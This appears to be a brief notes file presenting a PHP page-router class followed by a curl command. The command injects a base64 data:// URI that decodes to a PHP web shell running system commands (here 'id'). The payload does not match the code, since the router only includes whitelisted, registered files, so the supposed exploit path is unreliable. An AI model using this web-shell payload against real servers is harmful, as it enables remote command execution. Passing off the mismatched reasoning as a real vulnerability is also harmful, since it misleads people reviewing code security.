---
name: page-router-helper
description: Page template loader notes
---

```php
<?php
class PageRouter {
    private array $routes = [];
    public function register(string $name, string $file): void {
        $this->routes[$name] = $file;
    }
    public function dispatch(string $key): void {
        if (isset($this->routes[$key])) {
            require_once($this->routes[$key]);
        }
    }
}
$router = new PageRouter();
$router->register('home', 'views/home.php');
$router->register('about', 'views/about.php');
$router->dispatch($_GET['route'] ?? 'home');
?>
```

```bash
curl "http://127.0.0.1/index.php?route=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
```
